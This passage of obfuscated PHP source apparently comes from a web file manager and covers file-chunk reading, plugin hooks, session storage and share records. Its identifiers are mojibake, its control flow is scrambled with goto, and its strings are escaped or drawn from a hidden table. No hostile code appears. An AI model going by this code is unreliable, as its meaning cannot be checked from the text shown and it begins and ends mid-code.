$this->info($BÙæ‘·ì„Œ); return array($cÙà›Ö´×[1384] => 0, $cÙà›Ö´×[1385] => 0, $cÙà›Ö´×[12] => 32768 + 511, $cÙà›Ö´×[1386] => 0, $cÙà›Ö´×[1387] => 0, $cÙà›Ö´×[1388] => 0, $cÙà›Ö´×[1389] => 0, $cÙà›Ö´×[77] => $Có…îµÊÍß[$cÙà›Ö´×[77]], $cÙà›Ö´×[1390] => $Có…îµÊÍß[$cÙà›Ö´×[1259]], $cÙà›Ö´×[1346] => $Có…îµÊÍß[$cÙà›Ö´×[83]], $cÙà›Ö´×[1345] => $Có…îµÊÍß[$cÙà›Ö´×[192]], $cÙà›Ö´×[1391] => 0, $cÙà›Ö´×[1392] => 0); } static $fileInfo = array(); public function info($FÚÑ¶‹ã‚Ô) { $BˆïìôéøÒ = $_SERVER[…ë˜õ][1393]; if (isset(self::$fileInfo[$FÚÑ¶‹ã‚Ô])) { return self::$fileInfo[$FÚÑ¶‹ã‚Ô]; } if (substr($FÚÑ¶‹ã‚Ô, 0, strlen($BˆïìôéøÒ)) != $BˆïìôéøÒ) { return !1; } self::$fileInfo[$FÚÑ¶‹ã‚Ô] = IO::info(substr($FÚÑ¶‹ã‚Ô, strlen($BˆïìôéøÒ))); return self::$fileInfo[$FÚÑ¶‹ã‚Ô]; } public static function read($FÓä­¶ÖƒÕ, $d¤³Òğ¹èé, $Fğ·Ç ®²) { if (!isset(self::$_fopenCache[$FÓä­¶ÖƒÕ])) { $dÎŠ¨‹®Ê• = new StreamWrapperIO(); $dÎŠ¨‹®Ê•->stream_open($FÓä­¶ÖƒÕ); self::$_fopenCache[$FÓä­¶ÖƒÕ] = $dÎŠ¨‹®Ê•; } $dÎŠ¨‹®Ê• = self::$_fopenCache[$FÓä­¶ÖƒÕ]; return $dÎŠ¨‹®Ê•->fileSubstr($d¤³Òğ¹èé, $Fğ·Ç ®²); } public static function _read($E³ÈªâÂË , $FáĞÃËØ™Ë, $cìé–¡¤Ñ) { goto E”’‰é‡ˆò; BŠ˜¡¢å: $aÒ„äÚ‚ñä = 8192; fseek($bÈô‡âôïª, $FáĞÃËØ™Ë, SEEK_SET); $Dİ§ñ÷ùô = $AàÆÛÃŸÉ˜[33]; goto aùƒÜËÔß; aùƒÜËÔß: $fÄå‚–³ë… = 0; while ($fÄå‚–³ë… < $cìé–¡¤Ñ) { $dâÙ¶”Æ”Ê = min($aÒ„äÚ‚ñä, $cìé–¡¤Ñ - $fÄå‚–³ë…); $Dİ§ñ÷ùô .= fread($bÈô‡âôïª, $dâÙ¶”Æ”Ê); $fÄå‚–³ë… += $dâÙ¶”Æ”Ê; } fclose($bÈô‡âôïª); goto aò…˜‰ ¯à; aò…˜‰ ¯à: return $Dİ§ñ÷ùô; goto DñÔäŒšÅÁ; E”’‰é‡ˆò: $AàÆÛÃŸÉ˜ =& $_SERVER[…ë˜õ]; $bÈô‡âôïª = fopen($E³ÈªâÂË , $AàÆÛÃŸÉ˜[1263]); if (!$bÈô‡âôïª) { return $AàÆÛÃŸÉ˜[33]; } goto BŠ˜¡¢å; DñÔäŒšÅÁ: } public function fileSubstr($F›£ÇŠ¬ë, $aĞÃøƒè•Ë) { goto CÅìÀ„¸…º; dè¹ƒó‡÷: ksort($f¨Öšã‹“); $B‚¼Ğœ÷Íñ = substr($c©ö½‚ÄĞÅ, $F›£ÇŠ¬ë - $cÛ–Öö‹ĞÎ, $aĞÃøƒè•Ë); return $B‚¼Ğœ÷Íñ; goto dÊˆæ†ìÑå; dÊéØ„•½³: foreach ($f¨Öšã‹“ as $DµôŸî†‘ => $eĞ¤ÔêôË‘) { $DµôŸî†‘ = intval($DµôŸî†‘); $AÔÓÙäÒ‰à = $DµôŸî†‘ + strlen($eĞ¤ÔêôË‘); if ($F›£ÇŠ¬ë >= $AÔÓÙäÒ‰à) { continue; } if ($F›£ÇŠ¬ë >= $DµôŸî†‘ && $F›£ÇŠ¬ë + $aĞÃøƒè•Ë <= $AÔÓÙäÒ‰à) { return substr($eĞ¤ÔêôË‘, $F›£ÇŠ¬ë - $DµôŸî†‘, $aĞÃøƒè•Ë); } break; } if (count($f¨Öšã‹“) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($eÈ§¯¶ˆ¡–[1394], $eÈ§¯¶ˆ¡–[1395] . count($f¨Öšã‹“) . "\73\x73\164\x61\x72\x74\75{$F›£ÇŠ¬ë}\54\x6c\x65\x6e\147\164\x68\x3d{$aĞÃøƒè•Ë}\73\160\x6f\163\x65\72{$DµôŸî†‘}\176{$AÔÓÙäÒ‰à}"); throw new Exception($eÈ§¯¶ˆ¡–[1396]); } $cÛ–Öö‹ĞÎ = intval($F›£ÇŠ¬ë / $D÷‰±…ñ“†) * $D÷‰±…ñ“†; goto aŞ’¬‰£‘Â; CÄŠ’ĞùŸå: $fšÄÛñ²›„ = $aĞÃøƒè•Ë; if ($F›£ÇŠ¬ë < 0) { $F›£ÇŠ¬ë = $bºÒ®ç÷Šë + $F›£ÇŠ¬ë; } if ($aĞÃøƒè•Ë === !1) { $aĞÃøƒè•Ë = $bºÒ®ç÷Šë - $F›£ÇŠ¬ë; } goto Fˆ®èƒ¯—ß; cñÉãšø: $DµôŸî†‘ = 0; $AÔÓÙäÒ‰à = 0; $eĞ¤ÔêôË‘ = $eÈ§¯¶ˆ¡–[33]; goto dÊéØ„•½³; CÅìÀ„¸…º: $eÈ§¯¶ˆ¡– =& $_SERVER[…ë˜õ]; $bºÒ®ç÷Šë = $this->info[$eÈ§¯¶ˆ¡–[77]]; $a˜Š¤ó›Ã = $F›£ÇŠ¬ë; goto CÄŠ’ĞùŸå; aŞ’¬‰£‘Â: $C½¥¯•¡…² = ceil(($F›£ÇŠ¬ë + $aĞÃøƒè•Ë) / $D÷‰±…ñ“†) * $D÷‰±…ñ“† - $cÛ–Öö‹ĞÎ; $c©ö½‚ÄĞÅ = IO::fileSubstr($this->path, $cÛ–Öö‹ĞÎ, $C½¥¯•¡…²); $f¨Öšã‹“[$cÛ–Öö‹ĞÎ . $eÈ§¯¶ˆ¡–[33]] = $c©ö½‚ÄĞÅ; goto dè¹ƒó‡÷; Fˆ®èƒ¯—ß: if ($F›£ÇŠ¬ë + $aĞÃøƒè•Ë > $bºÒ®ç÷Šë) { $aĞÃøƒè•Ë = $bºÒ®ç÷Šë - $F›£ÇŠ¬ë; } if ($aĞÃøƒè•Ë <= 0) { return $eÈ§¯¶ˆ¡–[33]; } if ($F›£ÇŠ¬ë < 0 || $F›£ÇŠ¬ë >= $bºÒ®ç÷Šë || $aĞÃøƒè•Ë <= 0 || $aĞÃøƒè•Ë > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\x65\122\145\141\x64\40\145\x72\162\157\x72\x21\x20\x73\x74\x61\x72\x74\75{$F›£ÇŠ¬ë}\73\154\145\x6e\x67\164\x68\75{$aĞÃøƒè•Ë}\x3b\x20\x73\151\172\x65\75{$bºÒ®ç÷Šë}\x3b"); } goto E‹ÀÇØŠÊ; E‹ÀÇØŠÊ: $D÷‰±…ñ“† = 64 * 1024; $f¨Öšã‹“ =& self::$_chunkBuffer[$this->path]; if (!$f¨Öšã‹“) { $f¨Öšã‹“ = array(); } goto cñÉãšø; dÊˆæ†ìÑå: } private function log($CêÅ¥ ²¬ß, $FËé†Æ©) { $Dªºëë¸ˆò =& $_SERVER[…ë˜õ]; $a×„œÌ¡µá = timeFloat() - $this->timeStart; write_log(sprintf($Dªºëë¸ˆò[1397], $CêÅ¥ ²¬ß, $this->info[$Dªºëë¸ˆò[28]], $a×„œÌ¡µá, $FËé†Æ©), $Dªºëë¸ˆò[1083]); } } goto a¨»·ã¨×Õ; cóÎ¨ÓÍÈ’: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\160\x6c\165\147\151\156\x4c\x69\x73\x74"; public $field = array("\156\141\155\145", "\163\164\141\164\x75\x73", "\162\x65\147\151\x65\163\x74", "\143\157\156\146\x69\147"); public function loadList($FÖæÔÒÃ÷í = false) { $bÒãïÃ‹ñ‘ = array_to_keyvalue($this->listData(), $_SERVER[…ë˜õ][28]); if ($FÖæÔÒÃ÷í) { return $bÒãïÃ‹ñ‘[$FÖæÔÒÃ÷í]; } return $bÒãïÃ‹ñ‘; } public function init() { $FĞ«éƒ‡Ÿ =& $_SERVER[…ë˜õ]; Hook::trigger($FĞ«éƒ‡Ÿ[1807]); $fí‘ƒÒŞ¡¸ = $this->loadPluginList(); foreach ($fí‘ƒÒŞ¡¸ as $fÖ²²‰¶Æ¿ => $AêÑ‹š¸ø¯) { $d–ÆòÅĞ£õ = $this->appAllow($fÖ²²‰¶Æ¿, $AêÑ‹š¸ø¯); if (!$d–ÆòÅĞ£õ) { continue; } foreach ($AêÑ‹š¸ø¯[$FĞ«éƒ‡Ÿ[1808]] as $D„íš¯šò‘ => $DãåôØÄ¨«) { Hook::bind($D„íš¯šò‘, $DãåôØÄ¨«); } } Hook::trigger($FĞ«éƒ‡Ÿ[1809]); Hook::trigger(ACTION); } public function appAllow($dÃ¶¼ÃŞ´, $AÇ¾Øõ¼’Ë, $A­Œ×‰­ = true) { $d¨¼òâµë‚ =& $_SERVER[…ë˜õ]; $CÉïèÚ³˜ = PLUGIN_DIR . $dÃ¶¼ÃŞ´ . $d¨¼òâµë‚[1810]; if (!is_array($AÇ¾Øõ¼’Ë) || !is_array($AÇ¾Øõ¼’Ë[$d¨¼òâµë‚[1808]]) || $AÇ¾Øõ¼’Ë[$d¨¼òâµë‚[731]] != 1 || !is_file($CÉïèÚ³˜)) { return !1; } if ($GLOBALS[$d¨¼òâµë‚[479]] == 1) { return !0; } if ($A­Œ×‰­ && !Action($d¨¼òâµë‚[1811])->checkAuth($dÃ¶¼ÃŞ´)) { return !1; } return !0; } public function unInstall($cÅ‹ĞÓÕÔÔ) { $C›ä¼×ß¹³ =& $_SERVER[…ë˜õ]; $eÙğÃµ¥Æ = $this->loadList($cÅ‹ĞÓÕÔÔ); if (file_exists(PLUGIN_DIR . $cÅ‹ĞÓÕÔÔ)) { Hook::apply($cÅ‹ĞÓÕÔÔ . $C›ä¼×ß¹³[1812]); } $this->remove($eÙğÃµ¥Æ[$C›ä¼×ß¹³[388]]); } public function changeStatus($eè¦Ùâõ•¬, $béÊÖ½ù¢Ñ) { $eõ¦Ãª°£‚ =& $_SERVER[…ë˜õ]; $dä¥›¾¼ß» = $this->loadList($eè¦Ùâõ•¬); if ($béÊÖ½ù¢Ñ) { Hook::apply($eè¦Ùâõ•¬ . $eõ¦Ãª°£‚[1813]); } $this->update($dä¥›¾¼ß»[$eõ¦Ãª°£‚[388]], array($eõ¦Ãª°£‚[1814] => $béÊÖ½ù¢Ñ)); } public function appRegist($dÀ˜¤çç¤, $E’¶‚ğŸ½…) { $a™‹èÆ¹ºË =& $_SERVER[…ë˜õ]; $Cë÷Û‡Éø† = $this->loadList($dÀ˜¤çç¤); if ($Cë÷Û‡Éø†) { $this->update($Cë÷Û‡Éø†[$a™‹èÆ¹ºË[388]], array($a™‹èÆ¹ºË[1808] => $E’¶‚ğŸ½…)); } else { $fõ¨†ÅİĞ = array($a™‹èÆ¹ºË[28] => $dÀ˜¤çç¤, $a™‹èÆ¹ºË[1808] => $E’¶‚ğŸ½…, $a™‹èÆ¹ºË[731] => 0, $a™‹èÆ¹ºË[6] => $this->getConfigDefault($dÀ˜¤çç¤)); $this->insert($fõ¨†ÅİĞ); } } public function getConfigDefault($D§‘‚¡ª´) { $bÉ˜›©ğ¹¼ =& $_SERVER[…ë˜õ]; $dŒš¿«ô = array(); $f›ëºÜ×À = $this->getPackageJson($D§‘‚¡ª´); if (!$f›ëºÜ×À && is_array($f›ëºÜ×À[$bÉ˜›©ğ¹¼[1815]])) { return $dŒš¿«ô; } foreach ($f›ëºÜ×À[$bÉ˜›©ğ¹¼[1815]] as $AÁ¬Òò‰‡ => $Dƒ„Ôà–Ã) { if (!isset($Dƒ„Ôà–Ã[$bÉ˜›©ğ¹¼[370]]) || isset($dŒš¿«ô[$AÁ¬Òò‰‡])) { continue; } $dŒš¿«ô[$AÁ¬Òò‰‡] = $Dƒ„Ôà–Ã[$bÉ˜›©ğ¹¼[370]]; } return $dŒš¿«ô; } public function getPackageJson($Bƒ—ß¸íÉÒ) { return Hook::apply($Bƒ—ß¸íÉÒ . $_SERVER[…ë˜õ][1816]); } public function getConfig($c°…ñ¹ÊŒ, $e®ö‰Ä¾æ = false) { $Dõ†¶ôªÉ =& $_SERVER[…ë˜õ]; $cÊ¯¥ÕÆ¦ = array(); $eŠ“¯‹Ùò = $this->loadList($c°…ñ¹ÊŒ); if ($eŠ“¯‹Ùò && is_array($eŠ“¯‹Ùò[$Dõ†¶ôªÉ[6]])) { $cÊ¯¥ÕÆ¦ = $eŠ“¯‹Ùò[$Dõ†¶ôªÉ[6]]; } if (!$cÊ¯¥ÕÆ¦ || $e®ö‰Ä¾æ) { $cÊ¯¥ÕÆ¦ = $this->getConfigDefault($c°…ñ¹ÊŒ); } return $cÊ¯¥ÕÆ¦; } public function setConfig($d¬õù ÀìÒ, $C–°¹„ÊÍ„ = false) { goto Bîâ›¬Ã‚; c”øÈ–‰­È: $this->update($A’…ô ­[$aÉŒŠ¥‚è[388]], array($aÉŒŠ¥‚è[6] => $a©”¹…ğå•)); goto a¼¸ÇÜòğ; AÍ³¡Ÿù‰£: $a©”¹…ğå• = $A’…ô ­[$aÉŒŠ¥‚è[6]]; if ($C–°¹„ÊÍ„ == !1) { $a©”¹…ğå• = array(); $C–°¹„ÊÍ„ = $this->getConfigDefault($d¬õù ÀìÒ); } foreach ($C–°¹„ÊÍ„ as $C­ÌÄ¶áŸó => $E×àïã‘óï) { $a©”¹…ğå•[$C­ÌÄ¶áŸó] = is_string($E×àïã‘óï) ? trim($E×àïã‘óï) : $E×àïã‘óï; } goto c”øÈ–‰­È; Bîâ›¬Ã‚: $aÉŒŠ¥‚è =& $_SERVER[…ë˜õ]; $A’…ô ­ = $this->loadList($d¬õù ÀìÒ); if (!$A’…ô ­) { return !1; } goto AÍ³¡Ÿù‰£; a¼¸ÇÜòğ: } public function viewList() { goto AáÙÙ‰àØé; FÑ¾ †×¡°: $f—§ğšôâŒ = $this->loadPluginList(); $a½¯º×Ê×÷ = array(); foreach ($f—§ğšôâŒ as $E„Ò¶æİÎ– => $bÚ˜ÒšİÀî) { unset($bÚ˜ÒšİÀî[$cóÏ‰²–Àë[1808]], $bÚ˜ÒšİÀî[$cóÏ‰²–Àë[6]]); $Aí”íø§¦… = PLUGIN_DIR . $bÚ˜ÒšİÀî[$cóÏ‰²–Àë[28]] . $cóÏ‰²–Àë[1810]; if (!is_file($Aí”íø§¦…)) { continue; } $aº¬ï‹âñ÷ = Hook::apply($bÚ˜ÒšİÀî[$cóÏ‰²–Àë[28]] . $cóÏ‰²–Àë[1816]); if (is_array($aº¬ï‹âñ÷)) { $a½¯º×Ê×÷[$E„Ò¶æİÎ–] = array_merge($bÚ˜ÒšİÀî, $aº¬ï‹âñ÷); } } goto fã–”¶¿ù; AáÙÙ‰àØé: $cóÏ‰²–Àë =& $_SERVER[…ë˜õ]; $f—§ğšôâŒ = $this->loadList(); $this->pluginScan($f—§ğšôâŒ); goto FÑ¾ †×¡°; fã–”¶¿ù: return $a½¯º×Ê×÷; goto f—ÖÉ’±İ; f—ÖÉ’±İ: } private function loadPluginList() { $CÜ¶×Êª³‡ =& $_SERVER[…ë˜õ]; $fÆ†„³öÑÒ = $this->loadList(); if (strtolower(MOD) == $CÜ¶×Êª³‡[1817]) { return $fÆ†„³öÑÒ; } $B®š—åâÎ‰ = Hook::trigger($CÜ¶×Êª³‡[1818], $fÆ†„³öÑÒ); if ($fÆ†„³öÑÒ && !$B®š—åâÎ‰) { die; } return $B®š—åâÎ‰ ? $B®š—åâÎ‰ : $fÆ†„³öÑÒ; } private function pluginScan($FïÔå¯†¶) { $cäóíğ’Ô =& $_SERVER[…ë˜õ]; recursion_dir(PLUGIN_DIR, $a…±ç¨ø·µ, $B®¡™ùµ¾, 0); foreach ($a…±ç¨ø·µ as $C‹¢î„˜¤) { $eöàÇõ™É¸ = get_path_this($C‹¢î„˜¤); if (isset($FïÔå¯†¶[$eöàÇõ™É¸]) || !file_exists($C‹¢î„˜¤ . $cäóíğ’Ô[1819]) || !file_exists($C‹¢î„˜¤ . $cäóíğ’Ô[1810])) { continue; } Hook::apply($eöàÇõ™É¸ . $cäóíğ’Ô[1813]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\137\163\x65\x73\163\x69\157\156"; public function get($DÉÜ­åˆ‘Á) { $B¨•ó³Û½ =& $_SERVER[…ë˜õ]; $fÀÓîâµÂÓ = $this->where(array($B¨•ó³Û½[1820] => $DÉÜ­åˆ‘Á))->find(); if (!is_array($fÀÓîâµÂÓ)) { return !1; } return $fÀÓîâµÂÓ[$B¨•ó³Û½[734]]; } public function set($a¼…éŒœÁÂ, $C‚ÛäšÑñ, $fôœÒ“‰™ = 3600) { $c“× —Ğˆ‡ =& $_SERVER[…ë˜õ]; $D³© ÁÜ¨¨ = array($c“× —Ğˆ‡[1820] => $a¼…éŒœÁÂ, $c“× —Ğˆ‡[1727] => $C‚ÛäšÑñ, $c“× —Ğˆ‡[1821] => $fôœÒ“‰™ + time()); if (Session::get($c“× —Ğˆ‡[1822])) { $D³© ÁÜ¨¨[$c“× —Ğˆ‡[1531]] = Session::get($c“× —Ğˆ‡[1822]); } else { $D³© ÁÜ¨¨[$c“× —Ğˆ‡[1531]] = 0; } if ($this->get($a¼…éŒœÁÂ)) { return $this->where(array($c“× —Ğˆ‡[1820] => $a¼…éŒœÁÂ))->save($D³© ÁÜ¨¨); } else { return $this->add($D³© ÁÜ¨¨, array(), !0); } } public function remove($B‡èÈêïÍ) { return $this->where(array($_SERVER[…ë˜õ][1820] => $B‡èÈêïÍ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[…ë˜õ][1823] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\155\x65", "\x74\x69\x6d\x65", "\x69\156\163\x65\162\164\x2c\165\160\x64\141\x74\x65", "\x66\x75\156\x63\x74\151\x6f\156"), array("\x63\162\145\141\164\145\124\x69\x6d\x65", "\x74\151\155\x65", "\151\x6e\163\145\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\157\160\x74\x69\157\x6e\163", '', "\151\156\163\145\162\164\x2c\x75\160\144\141\164\145\x2c\163\x65\154\145\x63\164", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($aÅÈò˜ù) { $b¼ì•‚·Åˆ =& $_SERVER[…ë˜õ]; $aáá´Ğ¾“Õ = isset($aÅÈò˜ù[0]) ? $aÅÈò˜ù[0] : !1; return array($b¼ì•‚·Åˆ[1824] => array(USER_ID, $b¼ì•‚·Åˆ[1825]), $b¼ì•‚·Åˆ[1768] => array($aáá´Ğ¾“Õ, $b¼ì•‚·Åˆ[1826])); } protected function listSimple() { $D‡®§Â¼À = array($_SERVER[…ë˜õ][1531] => USER_ID); $CÊƒè¯ğ–Ÿ = $this->field($this->fieldList)->where($D‡®§Â¼À)->select(); return $CÊƒè¯ğ–Ÿ ? $CÊƒè¯ğ–Ÿ : array(); } protected function getInfo($B”ñ…‰„Ö, $dµ£¿µÑíÛ = false) { $c‹’òèğİ¬ =& $_SERVER[…ë˜õ]; if ($dµ£¿µÑíÛ) { return $this->_getShareInfo(array($c‹’òèğİ¬[462] => $B”ñ…‰„Ö)); } $Eß™¨ÉÚ²Í = $this->cacheFunctionGet($c‹’òèğİ¬[1775], $B”ñ…‰„Ö); return $Eß™¨ÉÚ²Í; } public function getInfoByHash($A¨Àˆ˜¯ë¢) { return $this->_getShareInfo(array($_SERVER[…ë˜õ][464] => $A¨Àˆ˜¯ë¢)); } public function getInfoByPath($Cˆ²À¯ö´Î) { $BùˆôÓô =& $_SERVER[…ë˜õ]; $eÍª·Ÿ¯Ñİ = array($BùˆôÓô[1531] => USER_ID, $BùˆôÓô[390] => $Cˆ²À¯ö´Î); return $this->_getShareInfo($eÍª·Ÿ¯Ñİ); } public function getInfoBySourcePath($D†¿Ï¤–ÖÄ) { $Aæ¸¢‹Å« =& $_SERVER[…ë˜õ]; $Fò‡Ù…™í = array($Aæ¸¢‹Å«[1531] => USER_ID, $Aæ¸¢‹Å«[1076] => $D†¿Ï¤–ÖÄ); return $this->_getShareInfo($Fò‡Ù…™í); } private function _getShareInfo($d´ŞÚí¡Ş) { goto B…ïš÷÷; c¡…ÒÆ°¯: $d´ŞÚí¡Ş = array($C‰Í°Â­…[462] => $FÀ•¤“Ñ[$C‰Í°Â­…[462]]); $A§ÛÂÖéé = $C‰Í°Â­…[1827]; $e¿Â·òÅ¡¨ = Model($C‰Í°Â­…[559])->order($C‰Í°Â­…[388])->field($A§ÛÂÖéé)->where($d´ŞÚí¡Ş)->select(); goto bˆ¯ƒÃ†² ; bˆ¯ƒÃ†² : if ($FÀ•¤“Ñ[$C‰Í°Â­…[390]] == $C‰Í°Â­…[491]) { $FÀ•¤“Ñ[$C‰Í°Â­…[84]] = IO::info($FÀ•¤“Ñ[$C‰Í°Â­…[1076]]); } else { $FÀ•¤“Ñ[$C‰Í°Â­…[84]] = Model($C‰Í°Â­…[1209])->pathInfo($FÀ•¤“Ñ[$C‰Í°Â­…[390]]); } $FÀ•¤“Ñ[$C‰Í°Â­…[1828]] = $e¿Â·òÅ¡¨; return $FÀ•¤“Ñ; goto b‰ë†îè‘; B…ïš÷÷: $C‰Í°Â­… =& $_SERVER[…ë˜õ]; $FÀ•¤“Ñ = $this->where($d´ŞÚí¡Ş)->find(); if (!$FÀ•¤“Ñ) { return !1; } goto c¡…ÒÆ°¯; b‰ë†îè‘: } protected function getInfoAuth($Dœã‡§óª) { $EòÅ­õÑğé =& $_SERVER[…ë˜õ]; $CØ‘Ôœ’Å´ = $this->getInfo($Dœã‡§óª); $CØ‘Ôœ’Å´[$EòÅ­õÑğé[400]] = Model($EòÅ­õÑğé[476])->authMake($CØ‘Ôœ’Å´[$EòÅ­õÑğé[1828]]); return $CØ‘Ôœ’Å´; } protected function listData($d´ãÀÂÉ§Å = null, $cÛíÌŞùƒî = 300) { $BÃ´Š“» ã =& $_SERVER[…ë˜õ]; $AòšÚŞ¬Ç = array(array($BÃ´Š“» ã[467] => array($BÃ´Š“» ã[975], 0), $BÃ´Š“» ã[469] => array($BÃ´Š“» ã[975], 0), $BÃ´Š“» ã[1829] => $BÃ´Š“» ã[1783])); if ($d´ãÀÂÉ§Å == $BÃ´Š“» ã[1830]) { $AòšÚŞ¬Ç = array($BÃ´Š“» ã[467] => 1); } else { if ($d´ãÀÂÉ§Å == $BÃ´Š“» ã[1061]) { $AòšÚŞ¬Ç = array($BÃ´Š“» ã[469] => 1); } } $AòšÚŞ¬Ç[$BÃ´Š“» ã[1531]] = USER_ID; $DÍÇ£â‰Æ = $this->where($AòšÚŞ¬Ç)->selectPage($cÛíÌŞùƒî); return $DÍÇ£â‰Æ; } protected function listToMe($fë£Ô‹§« = 300) { goto aÆÊ¢õµÕõ; bâãë»´ç: $aÍ¨©¾Ñè‡ = array($d’‡¨Öµ³[1833] => $FáçÜ³º·ò, $d’‡¨Öµ³[1834] => $eÓ¢ÛÅÍÒ…[$d’‡¨Öµ³[362]]); return $aÍ¨©¾Ñè‡; goto DŠØáŒËêâ; C²õ×â´ì²: if ($aÇ¨ ÏÙ«ƒ) { $eÛº’ãÊØ‚ = array(array($d’‡¨Öµ³[544] => SourceModel::TYPE_USER, $d’‡¨Öµ³[478] => USER_ID), array($d’‡¨Öµ³[544] => SourceModel::TYPE_GROUP, $d’‡¨Öµ³[478] => array($d’‡¨Öµ³[7], $aÇ¨ ÏÙ«ƒ)), $d’‡¨Öµ³[1829] => $d’‡¨Öµ³[1783]); } $eÓ¢ÛÅÍÒ… = Model($d’‡¨Öµ³[559])->where($eÛº’ãÊØ‚)->selectPage($fë£Ô‹§«); $bŞÈÀ¦¾é = array_to_keyvalue_group($eÓ¢ÛÅÍÒ…[$d’‡¨Öµ³[365]], $d’‡¨Öµ³[462]); goto Aå¡ÛĞ»Ùö; Aå¡ÛĞ»Ùö: if (!$bŞÈÀ¦¾é) { return $eÓ¢ÛÅÍÒ…; } $B’ï”ì½ = $d’‡¨Öµ³[1832]; $eÛº’ãÊØ‚ = array($d’‡¨Öµ³[462] => array($d’‡¨Öµ³[405], array_keys($bŞÈÀ¦¾é))); goto b‰Ôâ†»ëÉ; aÆÊ¢õµÕõ: $d’‡¨Öµ³ =& $_SERVER[…ë˜õ]; $aÇ¨ ÏÙ«ƒ = Model($d’‡¨Öµ³[1831])->userGroupParents(USER_ID); $eÛº’ãÊØ‚ = array($d’‡¨Öµ³[544] => SourceModel::TYPE_USER, $d’‡¨Öµ³[478] => USER_ID); goto C²õ×â´ì²; b‰Ôâ†»ëÉ: $FáçÜ³º·ò = $this->field($B’ï”ì½)->where($eÛº’ãÊØ‚)->select(); foreach ($FáçÜ³º·ò as $E–ÀÆáÖ»Ÿ => &$c…À¸÷Ô®Æ) { $c…À¸÷Ô®Æ[$d’‡¨Öµ³[1828]] = $bŞÈÀ¦¾é[$c…À¸÷Ô®Æ[$d’‡¨Öµ³[462]]]; } unset($c…À¸÷Ô®Æ); goto bâãë»´ç; DŠØáŒËêâ: } protected function shareAdd($Dõ–ÄÙŒ‹Ş, $b‘•¼‚äŒ•) { $a‡İÄõ—¼  =& $_SERVER[…ë˜õ]; $cçòÁÔÔáÔ = $this->_addShareData($Dõ–ÄÙŒ‹Ş, $b‘•¼‚äŒ•); if (!empty($b‘•¼‚äŒ•[$a‡İÄõ—¼ [1835]])) { $this->_shareAuthSet($cçòÁÔÔáÔ, $b‘•¼‚äŒ•[$a‡İÄõ—¼ [1835]]); } $this->shareEventAdd($Dõ–ÄÙŒ‹Ş, $b‘•¼‚äŒ•, $a‡İÄõ—¼ [1064]); return $cçòÁÔÔáÔ; } private function shareEventAdd($AÊ×Ø­•™, $eÏÛÕãæƒĞ, $f‡¡æ˜ äÒ = "\141\144\x64") { goto eŠ¢êÓÇ; eŠ¢êÓÇ: $E³¥ŞÔ–ò =& $_SERVER[…ë˜õ]; if ($f‡¡æ˜ äÒ == $E³¥ŞÔ–ò[1064]) { if ($eÏÛÕãæƒĞ[$E³¥ŞÔ–ò[467]] == $E³¥ŞÔ–ò[86]) { Model($E³¥ŞÔ–ò[528])->eventShare($AÊ×Ø­•™, $E³¥ŞÔ–ò[1836]); } if ($eÏÛÕãæƒĞ[$E³¥ŞÔ–ò[469]] == $E³¥ŞÔ–ò[86]) { Model($E³¥ŞÔ–ò[528])->eventShare($AÊ×Ø­•™, $E³¥ŞÔ–ò[1837]); } return; } $Cî¨±ÇÇß© = $this->getInfoByPath($AÊ×Ø­•™); goto còÚÌ¨ù‘; B¢÷áç±Å¤: if ($Cî¨±ÇÇß©[$E³¥ŞÔ–ò[469]] == $E³¥ŞÔ–ò[491] && $eÏÛÕãæƒĞ[$E³¥ŞÔ–ò[469]] == $E³¥ŞÔ–ò[86]) { $dÌ¥öŒ±ô¦ = $E³¥ŞÔ–ò[1837]; } if ($Cî¨±ÇÇß©[$E³¥ŞÔ–ò[469]] == $E³¥ŞÔ–ò[86] && $eÏÛÕãæƒĞ[$E³¥ŞÔ–ò[469]] == $E³¥ŞÔ–ò[491]) { $dÌ¥öŒ±ô¦ = $E³¥ŞÔ–ò[1840]; } Model($E³¥ŞÔ–ò[528])->eventShare($AÊ×Ø­•™, $dÌ¥öŒ±ô¦); goto f´Ñ­¸²°; còÚÌ¨ù‘: $dÌ¥öŒ±ô¦ = $E³¥ŞÔ–ò[1838]; if ($Cî¨±ÇÇß©[$E³¥ŞÔ–ò[467]] == $E³¥ŞÔ–ò[491] && $eÏÛÕãæƒĞ[$E³¥ŞÔ–ò[467]] == $E³¥ŞÔ–ò[86]) { $dÌ¥öŒ±ô¦ = $E³¥ŞÔ–ò[1836]; } if ($Cî¨±ÇÇß©[$E³¥ŞÔ–ò[467]] == $E³¥ŞÔ–ò[86] && $eÏÛÕãæƒĞ[$E³¥ŞÔ–ò[467]] == $E³¥ŞÔ–ò[491]) { $dÌ¥öŒ±ô¦ = $E³¥ŞÔ–ò[1839]; } goto B¢÷áç±Å¤; f´Ñ­¸²°: return; goto a²Ó¡Î±ò; a²Ó¡Î±ò: } private function _addShareData($f‡®á¼¥Ô¨, $c¶ãòµóÙ˜ = array()) { goto Eßêë¯‡»Ø; Eßêë¯‡»Ø: $aŒ®™¸ß =& $_SERVER[…ë˜õ]; $c ø¿ÆÈĞÏ = array($aŒ®™¸ß[404] => $f‡®á¼¥Ô¨, $aŒ®™¸ß[1522] => USER_ID); if ($f‡®á¼¥Ô¨ == 0) { $c ø¿ÆÈĞÏ = array($aŒ®™¸ß[1841] => $c¶ãòµóÙ˜[$aŒ®™¸ß[1076]], $aŒ®™¸ß[1522] => USER_ID); } goto b«»É½ºï; b«»É½ºï: if ($BÆø«˜Åà = $this->where($c ø¿ÆÈĞÏ)->find()) { return $BÆø«˜Åà[$aŒ®™¸ß[462]]; } if ($f‡®á¼¥Ô¨ == 0) { $bÎ™•Ã·å² = array($aŒ®™¸ß[28] => get_path_this($c¶ãòµóÙ˜[$aŒ®™¸ß[75]])); } else { $bÎ™•Ã·å² = Model($aŒ®™¸ß[796])->sourceInfo($f‡®á¼¥Ô¨); if (!$bÎ™•Ã·å²) { return !1; } } if (!$c¶ãòµóÙ˜[$aŒ®™¸ß[1436]]) { 